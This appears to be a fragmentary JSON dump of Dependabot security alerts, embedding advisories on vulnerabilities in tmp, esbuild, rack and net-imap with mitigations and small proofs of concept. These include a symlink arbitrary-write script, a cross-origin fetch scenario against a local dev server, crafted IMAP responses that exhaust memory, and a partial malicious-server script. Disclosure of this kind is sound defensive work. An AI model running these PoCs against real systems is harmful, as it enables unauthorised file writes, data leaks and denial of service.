allows arbitrary temporary file / directory write via symbolic link `dir` parameter","description":"### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https://github.com/raszi/node-tmp/issues/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    // assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    // must not fail on valid .<name> or ..<name> or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { // if (option === 'dir' || option === 'template') {\n    // assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); //<--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME/mydir1\n\nln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'\ntest 2: dir option must be relative to \"/tmp\", found \"/foo\".\ntest 3: dir option must be relative to \"/tmp\", found \"/home/user/mydir1\".\n```\n\n- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n// npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('/tmp/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file / directory write via

read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1.

Large request bodies can therefore be buffered completely into process memory before parsing, leading to denial of service (DoS) through memory exhaustion.\n\n## Details\n\nWhen handling non-multipart form submissions, Rack’s request parser performs:\n\n```ruby\nform_vars = get_header(RACK_INPUT).read\n```\n\nSince `read` is called with no argument, the entire request body is loaded into a Ruby `String`. This occurs before query parameter parsing or enforcement of any `params_limit`. As a result, Rack applications without an upstream body-size limit can experience unbounded memory allocation proportional to request size.\n\n## Impact\n\nAttackers can send large `application/x-www-form-urlencoded` bodies to consume process memory, causing slowdowns or termination by the operating system (OOM). The effect scales linearly with request size and concurrency. Even with parsing limits configured, the issue occurs *before* those limits are enforced.\n\n## Mitigation\n\n* Update to a patched version of Rack that enforces form parameter limits using `query_parser.bytesize_limit`, preventing unbounded reads of `application/x-www-form-urlencoded` bodies.\n* Enforce strict maximum body size at the proxy or web server layer (e.g., Nginx `client_max_body_size`, Apache `LimitRequestBody`).","severity":"high","identifiers":[{"value":"GHSA-6xw4-3v39-52mm","type":"GHSA"},{"value":"CVE-2025-61919","type":"CVE"}],"references":[{"url":"https://github.com/rack/rack/security/advisories/GHSA-6xw4-3v39-52mm"},{"url":"https://github.com/rack/rack/commit/4e2c903991a790ee211a3021808ff4fd6fe82881"},{"url":"https://github.com/rack/rack/commit/cbd541e8a3d0c5830a3c9a30d3718ce2e124f9db"},{"url":"https://github.com/rack/rack/commit/e179614c4a653283286f5f046428cbb85f21146f"},{"url":"https://nvd.nist.gov/vuln/detail/CVE-2025-61919"},{"url":"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-61919.yml"},{"url":"https://github.com/advisories/GHSA-6xw4-3v39-52mm"}],"published_at":"2025-10-10T17:33:35Z","updated_at":"2025-10-13T15:46:18Z","withdrawn_at":null,"vulnerabilities":[{"package":{"ecosystem":"rubygems","name":"rack"},"severity":"high","vulnerable_version_range":"< 2.2.20","first_patched_version":{"identifier":"2.2.20"}},{"package":{"ecosystem":"rubygems","name":"rack"},"severity":"high","vulnerable_version_range":">= 3.0, < 3.1.18","first_patched_version":{"identifier":"3.1.18"}},{"package":{"ecosystem":"rubygems","name":"rack"},"severity":"high","vulnerable_version_range":">= 3.2, < 3.2.3","first_patched_version":{"identifier":"3.2.3"}}],"cvss_severities":{"cvss_v3":{"vector_string":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H","score":7.5},"cvss_v4":{"vector_string":null,"score":0.0}},"epss":{"percentage":0.00081,"percentile":0.244},"cvss":{"vector_string":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H","score":7.5},"cwes":[{"cwe_id":"CWE-400","name":"Uncontrolled Resource Consumption"}]},"security_vulnerability":{"package":{"ecosystem":"rubygems","name":"rack"},"severity":"high","vulnerable_version_range":"< 2.2.20","first_patched_version":{"identifier":"2.2.20"}},"url":"https://api.github.com/repos/arlenagreer/american_laboratory_trading/dependabot/alerts/125","html_url":"https://github.com/arlenagreer/american_laboratory_trading/security/dependabot/125","created_at":"2025-10-10T18:16:12Z","updated_at":"2025-11-10T20:41:36Z","dismissed_at":"2025-11-10T20:41:36Z","dismissed_by":{"login":"arlenagreer","id":875825,"node_id":"MDQ6VXNlcjg3NTgyNQ==","avatar_url":"https://avatars.githubusercontent.com/u/875825?v=4","gravatar_id":"","url":"https://api.github.com/users/arlenagreer","html_url":"https://github.com/arlenagreer","followers_url":"https://api.github.com/users/arlenagreer/followers","following_url":"https://api.github.com/users/arlenagreer/following{/other_user}","gists_url":"https://api.github.com/users/arlenagreer/gists{/gist_id}","starred_url":"https://api.github.com/users/arlenagreer/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/arlenagreer/subscriptions","organizations_url":"https://api.github.com/users/arlenagreer/orgs","repos_url":"https://api.github.com/users/arlenagreer/repos","events_url":"https://api.github.com/users/arlenagreer/events{/privacy}","received_events_url":"https://api.github.com/users/arlenagreer/received_events","type":"User","user_view_type":"public","site_admin":false},"dismissed_reason":"fix_started","dismissed_comment":null,"fixed_at":null,"auto_dismissed_at":null},{"number":124,"state":"dismissed","dependency":{"package":{"ecosystem":"rubygems","name":"rack"},"manifest_path":"Gemfile.lock","scope":"runtime","relationship":"unknown"},"security_advisory":{"ghsa_id":"GHSA-r657-rxjc-j557","cve_id":"CVE-2025-61780","summary":"Rack has a Possible Information Disclosure Vulnerability","description":"## Summary\n\nA possible information disclosure vulnerability existed in `Rack::Sendfile` when running behind a proxy that supports `x-sendfile` headers (such as Nginx). Specially crafted headers could cause `Rack::Sendfile` to miscommunicate with the proxy and trigger unintended internal requests, potentially bypassing proxy-level access restrictions.\n\n## Details\n\nWhen `Rack::Sendfile` received untrusted `x-sendfile-type` or `x-accel-mapping` headers from a client, it would interpret them as proxy configuration directives. This could cause the middleware to send a \"redirect\" response to the proxy, prompting it to reissue a new internal request that was **not subject to the proxy's access controls**.\n\nAn attacker could exploit this by:\n1.

The vulnerability did not allow arbitrary file reads but could expose sensitive application routes.\n\nThis issue only affected systems meeting all of the following conditions:\n\n* The application used `Rack::Sendfile` with a proxy that supports `x-accel-redirect` (e.g., Nginx).\n* The proxy did **not** always set or remove the `x-sendfile-type` and `x-accel-mapping` headers.\n* The application exposed an endpoint that returned a body responding to `.to_path`.\n\n## Mitigation\n\n* Upgrade to a fixed version of Rack which requires explicit configuration to enable `x-accel-redirect`:\n\n  ```ruby\n  use Rack::Sendfile, \"x-accel-redirect\"\n  ```\n\n* Alternatively, configure the proxy to always set or strip the headers (you should be doing this!):\n\n  ```nginx\n  proxy_set_header x-sendfile-type x-accel-redirect;\n  proxy_set_header x-accel-mapping /var/www/=/files/;\n  ```\n\n* Or in Rails applications, disable sendfile completely:\n\n  ```ruby\n  config.action_dispatch.x_sendfile_header = nil\n  ```","severity":"medium","identifiers":[{"value":"GHSA-r657-rxjc-j557","type":"GHSA"},{"value":"CVE-2025-61780","type":"CVE"}],"references":[{"url":"https://github.com/rack/rack/security/advisories/GHSA-r657-rxjc-j557"},{"url":"https://github.com/rack/rack/commit/57277b7741581fa827472c5c666f6e6a33abd784"},{"url":"https://github.com/rack/rack/commit/7e69f65eefe9cd2868df9f9f3b0977b86f93523a"},{"url":"https://github.com/rack/rack/commit/fba2c8bc63eb787ff4b19bc612d315fda6126d85"},{"url":"https://nvd.nist.gov/vuln/detail/CVE-2025-61780"},{"url":"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-61780.yml"},{"url":"https://github.com/advisories/GHSA-r657-rxjc-j557"}],"published_at":"2025-10-10T17:31:31Z","updated_at":"2025-10-13T15:45:11Z","withdrawn_at":null,"vulnerabilities":[{"package":{"ecosystem":"rubygems","name":"rack"},"severity":"medium","vulnerable_version_range":"< 2.2.20","first_patched_version":{"identifier":"2.2.20"}},{"package":{"ecosystem":"rubygems","name":"rack"},"severity":"medium","vulnerable_version_range":">= 3.0, < 3.1.18","first_patched_version":{"identifier":"3.1.18"}},{"package":{"ecosystem":"rubygems","name":"rack"},"severity":"medium","vulnerable_version_range":">= 3.2, < 3.2.3","first_patched_version":{"identifier":"3.2.3"}}],"cvss_severities":{"cvss_v3":{"vector_string":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N","score":5.8},"cvss_v4":{"vector_string":null,"score":0.0}},"epss":{"percentage":0.00042,"percentile":0.12615},"cvss":{"vector_string":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N","score":5.8},"cwes":[{"cwe_id":"CWE-200","name":"Exposure of Sensitive Information to an Unauthorized Actor"},{"cwe_id":"CWE-441","name":"Unintended Proxy or Intermediary ('Confused Deputy')"},{"cwe_id":"CWE-913","name":"Improper Control of Dynamically-Managed Code Resources"}]},"security_vulnerability":{"package":{"ecosystem":"rubygems","name":"rack"},"severity":"medium","vulnerable_version_range":"< 2.2.20","first_patched_version":{"identifier":"2.2.20"}},"url":"https://api.github.com/repos/arlenagreer/american_laboratory_trading/dependabot/alerts/124","html_url":"https://github.com/arlenagreer/american_laboratory_trading/security/dependabot/124","created_at":"2025-10-10T18:15:45Z","updated_at":"2025-11-10T20:41:36Z","dismissed_at":"2025-11-10T20:41:36Z","dismissed_by":{"login":"arlenagreer","id":875825,"node_id":"MDQ6VXNlcjg3NTgyNQ==","avatar_url":"https://avatars.githubusercontent.com/u/875825?v=4","gravatar_id":"","url":"https://api.github.com/users/arlenagreer","html_url":"https://github.com/arlenagreer","followers_url":"https://api.github.com/users/arlenagreer/followers","following_url":"https://api.github.com/users/arlenagreer/following{/other_user}","gists_url":"https://api.github.com/users/arlenagreer/gists{/gist_id}","starred_url":"https://api.github.com/users/arlenagreer/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/arlenagreer/subscriptions","organizations_url":"https://api.github.com/users/arlenagreer/orgs","repos_url":"https://api.github.com/users/arlenagreer/repos","events_url":"https://api.github.com/users/arlenagreer/events{/privacy}","received_events_url":"https://api.github.com/users/arlenagreer/received_events","type":"User","user_view_type":"public","site_admin":false},"dismissed_reason":"fix_started","dismissed_comment":null,"fixed_at":null,"auto_dismissed_at":null},{"number":123,"state":"dismissed","dependency":{"package":{"ecosystem":"rubygems","name":"rack"},"manifest_path":"Gemfile.lock","scope":"runtime","relationship":"unknown"},"security_advisory":{"ghsa_id":"GHSA-wpv5-97wm-hp9c","cve_id":"CVE-2025-61772","summary":"Rack's multipart parser buffers unbounded per-part headers, enabling DoS (memory exhaustion)","description":"## Summary\n\n`Rack::Multipart::Parser` can accumulate unbounded data when a multipart part’s header block never terminates with the required blank line (`CRLFCRLF`).

As a result, attackers could use `;` separators to bypass the parameter count limit and submit more parameters than intended.\n\n## Details\n\nThe issue arises because `Rack::QueryParser#check_query_string` counts only `&` characters when determining the number of parameters, but the default separator regex `DEFAULT_SEP = /[&;] */n` splits on both `&` and `;`. This mismatch means that queries using `;` separators were not included in the parameter count, allowing `params_limit` to be bypassed.\n\nOther safeguards (`bytesize_limit` and `key_space_limit`) still applied, but did not prevent this particular bypass.\n\n## Impact\n\nApplications or middleware that directly invoke `Rack::QueryParser` with its default configuration (no explicit delimiter) could be exposed to increased CPU and memory consumption. This can be abused as a limited denial-of-service vector.\n\n`Rack::Request`, the primary entry point for typical Rack applications, uses `QueryParser` in a safe way and does not appear vulnerable by default. As such, the severity is considered **low**, with the impact limited to edge cases where `QueryParser` is used directly.\n\n## Mitigation\n\n* Upgrade to a patched version of Rack where both `&` and `;` are counted consistently toward `params_limit`.\n* If upgrading is not immediately possible, configure `QueryParser` with an explicit delimiter (e.g., `&`) to avoid the mismatch.\n* As a general

This way the session becomes to be a subject of race conditions in general sense over concurrent rack requests.\n\n### Impact\n\nWhen using the `Rack::Session::Pool` middleware, and provided the attacker can acquire a session cookie (already a major issue), the session may be restored if the attacker can trigger a long running request (within that same session) adjacent to the user logging out, in order to retain illicit access even after a user has attempted to logout.\n\n## Mitigation\n\n- Update to the latest version of `rack`, or\n- Ensure your application invalidates sessions

without imposing any limit on the number of parameters, allowing attackers to send requests with extremely large numbers of parameters.\n\n## Details\n\nThe vulnerability arises because `Rack::QueryParser` iterates over each `&`-separated key-value pair and adds it to a Hash without enforcing an upper bound on the total number of parameters. This allows an attacker to send a single request containing hundreds of thousands (or more) of parameters, which consumes excessive memory and CPU during parsing.\n\n## Impact\n\nAn attacker can trigger denial of service by sending specifically crafted HTTP requests, which can cause memory exhaustion or pin CPU resources, stalling or crashing the Rack server. This results in full service disruption until the affected worker is restarted.\n\n## Mitigation\n\n- Update to a version of Rack that limits the number of parameters parsed, or\n- Use middleware to enforce a maximum query string size or parameter count, or\n- Employ a reverse proxy (such as Nginx) to limit request sizes and reject oversized query strings or bodies.\n\nLimiting request body sizes and query string lengths at the web server or CDN level is an effective mitigation.","severity":"high","identifiers":[{"value":"GHSA-gjh7-p2fx-99vx","type":"GHSA"},{"value":"CVE-2025-46727","type":"CVE"}],"references":[{"url":"https://github.com/rack/rack/security/advisories/GHSA-gjh7-p2fx-99vx"},{"url":"https://nvd.nist.gov/vuln/detail/CVE-2025-46727"},{"url":"https://github.com/rack/rack/commit/2bb5263b464b65ba4b648996a579dbd180d2b712"},{"url":"https://github.com/rack/rack/commit/3f5a4249118d09d199fe480466c8c6717e43b6e3"},{"url":"https://github.com/rack/rack/commit/cd6b70a1f2a1016b73dc906f924869f4902c2d74"},{"url":"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-46727.yml"},{"url":"https://github.com/advisories/GHSA-gjh7-p2fx-99vx"}],"published_at":"2025-05-08T14:45:48Z","updated_at":"2025-05-09T14:35:13Z","withdrawn_at":null,"vulnerabilities":[{"package":{"ecosystem":"rubygems","name":"rack"},"severity":"high","vulnerable_version_range":"< 2.2.14","first_patched_version":{"identifier":"2.2.14"}},{"package":{"ecosystem":"rubygems","name":"rack"},"severity":"high","vulnerable_version_range":">= 3.0, < 3.0.16","first_patched_version":{"identifier":"3.0.16"}},{"package":{"ecosystem":"rubygems","name":"rack"},"severity":"high","vulnerable_version_range":">= 3.1, < 3.1.14","first_patched_version":{"identifier":"3.1.14"}}],"cvss_severities":{"cvss_v3":{"vector_string":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H","score":7.5},"cvss_v4":{"vector_string":null,"score":0.0}},"epss":{"percentage":0.00237,"percentile":0.46735},"cvss":{"vector_string":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H","score":7.5},"cwes":[{"cwe_id":"CWE-400","name":"Uncontrolled Resource Consumption"}]},"security_vulnerability":{"package":{"ecosystem":"rubygems","name":"rack"},"severity":"high","vulnerable_version_range":"< 2.2.14","first_patched_version":{"identifier":"2.2.14"}},"url":"https://api.github.com/repos/arlenagreer/american_laboratory_trading/dependabot/alerts/113","html_url":"https://github.com/arlenagreer/american_laboratory_trading/security/dependabot/113","created_at":"2025-05-08T19:22:50Z","updated_at":"2025-11-10T20:41:35Z","dismissed_at":"2025-11-10T20:41:35Z","dismissed_by":{"login":"arlenagreer","id":875825,"node_id":"MDQ6VXNlcjg3NTgyNQ==","avatar_url":"https://avatars.githubusercontent.com/u/875825?v=4","gravatar_id":"","url":"https://api.github.com/users/arlenagreer","html_url":"https://github.com/arlenagreer","followers_url":"https://api.github.com/users/arlenagreer/followers","following_url":"https://api.github.com/users/arlenagreer/following{/other_user}","gists_url":"https://api.github.com/users/arlenagreer/gists{/gist_id}","starred_url":"https://api.github.com/users/arlenagreer/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/arlenagreer/subscriptions","organizations_url":"https://api.github.com/users/arlenagreer/orgs","repos_url":"https://api.github.com/users/arlenagreer/repos","events_url":"https://api.github.com/users/arlenagreer/events{/privacy}","received_events_url":"https://api.github.com/users/arlenagreer/received_events","type":"User","user_view_type":"public","site_admin":false},"dismissed_reason":"fix_started","dismissed_comment":null,"fixed_at":null,"auto_dismissed_at":null},{"number":112,"state":"dismissed","dependency":{"package":{"ecosystem":"rubygems","name":"net-imap"},"manifest_path":"Gemfile.lock","scope":"runtime","relationship":"unknown"},"security_advisory":{"ghsa_id":"GHSA-j3g3-5qv5-52mj","cve_id":"CVE-2025-43857","summary":"net-imap rubygem vulnerable to possible DoS by memory exhaustion","description":"### Summary\n\nThere is a possibility for denial of service by memory exhaustion when `net-imap` reads server responses.  At any time while the client is connected, a malicious server can send can send a \"literal\" byte count, which is automatically read by the client's receiver thread.  The response reader immediately allocates memory for the number of bytes indicated by the server response.\n\nThis should not be an issue when securely connecting to trusted IMAP servers that are well-behaved.  It can affect insecure connections and buggy, untrusted, or compromised servers (for example, connecting to a user supplied hostname).\n\n### Details\n\nThe IMAP protocol allows \"literal\" strings to be sent in responses, prefixed with their size in curly braces (e.g. `{1234567890}\\r\\n`).  When `Net::IMAP` receives a response containing a literal string, it calls `IO#read` with that size.  When called with a size, `IO#read` immediately allocates memory to buffer the entire string before processing continues.  The server does not need to send any more data.  There is no limit on the size of literals that will be accepted.\n\n### Fix\n#### Upgrade\nUsers should upgrade to `net-imap` 0.5.7 or later.  A configurable `max_response_size` limit has been added to `Net::IMAP`'s response reader.  The `max_response_size` limit has also been backported to `net-imap` 0.2.5, 0.3.9, and 0.4.20.\n\nTo set a global value for `max_response_size`, users must upgrade to `net-imap` ~> 0.4.20, or > 0.5.7.\n\n#### Configuration\n\nTo avoid backward compatibility issues for secure connections to trusted well-behaved servers, the default `max_response_size` for `net-imap` 0.5.7 is _very high_ (512MiB), and the default `max_response_size` for `net-imap` ~> 0.4.20, ~> 0.3.9, and 0.2.5 is `nil` (unlimited).\n\nWhen connecting to untrusted servers or using insecure connections, a much lower `max_response_size` should be used.\n```ruby\n# Set the global max_response_size (only ~> v0.4.20, > 0.5.7)\nNet::IMAP.config.max_response_size = 256 << 10 # 256 KiB\n\n# Set when creating the connection\nimap = Net::IMAP.new(hostname, ssl: true,\n                     max_response_size: 16 << 10) # 16 KiB\n\n# Set after creating the connection\nimap.max_response_size = 256 << 20 # 256 KiB\n# flush currently waiting read, to ensure the new setting is loaded\nimap.noop\n```\n\n_**Please Note:**_ `max_response_size` only limits the size _per response_.  It does not prevent a flood of individual responses and it does not limit how many unhandled responses may be stored on the responses hash.  Users are responsible for adding response handlers to prune excessive unhandled responses.\n\n#### Compatibility with lower `max_response_size`\n\nA lower `max_response_size` may cause a few commands which legitimately return very large responses to raise an exception and close the connection.  The `max_response_size` could be temporarily set to a higher value, but paginated or limited versions of commands should be used whenever possible.  For example, to fetch message bodies:\n\n```ruby\nimap.max_response_size = 256 << 20 # 256 KiB\nimap.noop # flush currently waiting read\n\n# fetch a message in 252KiB chunks\nsize = imap.uid_fetch(uid, \"RFC822.SIZE\").first.rfc822_size\nlimit = 252 << 10\nmessage = ((0..size) % limit).each_with_object(\"\") {|offset, str|\n  str << imap.uid_fetch(uid, \"BODY.PEEK[]<#{offset}.#{limit}>\").first.message(offset:)\n}\n\nimap.max_response_size = 16 << 20 # 16 KiB\nimap.noop # flush currently waiting read\n```\n\n### References\n\n* PR to introduce max_response_size: https://github.com/ruby/net-imap/pull/444\n  * Specific commit: [0ae8576c1 -

At any time while the client is connected, a malicious server can send  can send highly compressed `uid-set` data which is automatically read by the client's receiver thread.  The response parser uses `Range#to_a` to convert the `uid-set` data into arrays of integers, with no limitation on the expanded size of the ranges.\n\n### Details\nIMAP's `uid-set` and `sequence-set` formats can compress ranges of numbers, for example: `\"1,2,3,4,5\"` and `\"1:5\"` both represent the same set.  When `Net::IMAP::ResponseParser` receives `APPENDUID` or `COPYUID` response codes, it expands each `uid-set` into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted `APPENDUID` or `COPYUID` responses with very large `uid-set` ranges.\n\nThe `Net::IMAP` client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the `APPENDUID` or `COPYUID` responses.\n\nMalicious inputs:\n\n```ruby\n# 40 bytes expands to ~1.6GB:\n\"* OK [COPYUID 1 1:99999999 1:99999999]\\r\\n\"\n\n# Worst *valid* input scenario (using uint32 max),\n# 44 bytes expands to 64GiB:\n\"* OK [COPYUID 1 1:4294967295 1:4294967295]\\r\\n\"\n\n# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than\n# UINT32_MAX can be created.  For example, the following would theoretically\n# expand to almost 800 exabytes:\n\"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\\r\\n\"\n```\n\nSimple way to test this:\n```ruby\nrequire \"net/imap\"\n\ndef test(size)\n  input = \"A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\\r\\n\"\n  parser = Net::IMAP::ResponseParser.new\n  parser.parse input\nend\n\ntest(99_999_999)\n```\n\n### Fixes\n\n#### Preferred Fix, minor API changes\nUpgrade to v0.4.19, v0.5.6, or higher, and configure:\n```ruby\n# globally\nNet::IMAP.config.parser_use_deprecated_uidplus_data = false\n# per-client\nimap = Net::IMAP.new(hostname, ssl: true,\n                               parser_use_deprecated_uidplus_data: false)\nimap.config.parser_use_deprecated_uidplus_data = false\n```\n\nThis replaces `UIDPlusData` with `AppendUIDData` and `CopyUIDData`.  These classes store their UIDs as `Net::IMAP::SequenceSet` objects (_not_ expanded into arrays of integers).  Code that does not handle `APPENDUID` or `COPYUID` responses will not notice any difference.  Code that does handle these responses _may_ need to be updated.  See the documentation for [UIDPlusData](https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html), [AppendUIDData](https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html) and [CopyUIDData](https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html).\n\nFor v0.3.8, this option is not available.\nFor v0.4.19, the default value is `true`.\nFor v0.5.6, the default value is `:up_to_max_size`.\nFor v0.6.0, the only allowed value will be `false`  _(`UIDPlusData` will be removed from v0.6)_.\n\n#### Mitigation, backward compatible API\nUpgrade to v0.3.8, v0.4.19, v0.5.6, or higher.\n\nFor backward compatibility, `uid-set` can still be expanded into an array, but a maximum limit will be applied.\n\nAssign `config.parser_max_deprecated_uidplus_data_size` to set the maximum `UIDPlusData` UID set size.\nWhen `config.parser_use_deprecated_uidplus_data == true`, larger sets will raise `Net::IMAP::ResponseParseError`.\nWhen  `config.parser_use_deprecated_uidplus_data == :up_to_max_size`, larger sets will use `AppendUIDData` or `CopyUIDData`.\n\nFor v0.3,8, this limit is _hard-coded_ to 10,000, and larger sets will always raise `Net::IMAP::ResponseParseError`.\nFor v0.4.19, the limit defaults to 1000.\nFor v0.5.6, the limit defaults to 100.\nFor v0.6.0, the limit will be ignored  _(`UIDPlusData` will be removed from v0.6)_.\n\n#### Please Note: unhandled responses\nIf the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, `net-imap` has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  _This is not significantly different from connecting to a trusted server with a long-lived connection._  To limit the maximum number of retained responses, a simple handler might look something like the following:\n\n  ```ruby\n  limit = 1000\n  imap.add_response_handler do |resp|\n    next unless resp.respond_to?(:name) && resp.respond_to?(:data)\n    name = resp.name\n    code = resp.data.code&.name if resp.data.respond_to?(:code)\n    if Net::IMAP::VERSION > \"0.4.0\"\n      imap.responses(name) { _1.slice!(0...-limit) }\n      imap.responses(code) { _1.slice!(0...-limit) }\n    else\n      imap.responses(name).slice!(0...-limit)\n      imap.responses(code).slice!(0...-limit)\n    end\n  end\n  ```\n\n### Proof of concept\n\nSave the following to a ruby file (e.g: `poc.rb`) and make it executable:\n```ruby\n#!/usr/bin/env ruby\nrequire 'socket'\nrequire 'net/imap'\n\nif !defined?(Net::IMAP.config)\n  puts \"Net::IMAP.config is not available\"\nelsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)\n  puts \"Net::IMAP.config.parser_use_deprecated_uidplus_data is not available\"\nelse\n  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size\n  puts \"Updated parser_use_deprecated_uidplus_data to :up_to_max_size\"\nend\n\nsize = Integer(ENV[\"UID_SET_SIZE\"] || 2**32-1)\n\ndef server_addr\n  Addrinfo.tcp(\"localhost\", 0).ip_address\nend\n\ndef create_tcp_server\n  TCPServer.new(server_addr, 0)\nend\n\ndef start_server\n  th = Thread.new do\n    yield\n  end\n  sleep 0.1 until th.stop?\nend\n\ndef copyuid_response(tag: \"*\", size: 2**32-1, text: \"too large?\")\n  \"#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\\r\\n\"\nend\n\ndef appenduid_response(tag: \"*\", size: 2**32-1, text: \"too large?\")\n  \"#{tag} OK [APPENDUID 1 1:#{size}] #{text}\\r\\n\"\nend\n\nserver = create_tcp_server\nport = server.addr[1]\nputs \"Server started on port #{port}\"\n\n# server\nstart_server do\n  sock = server.accept\n  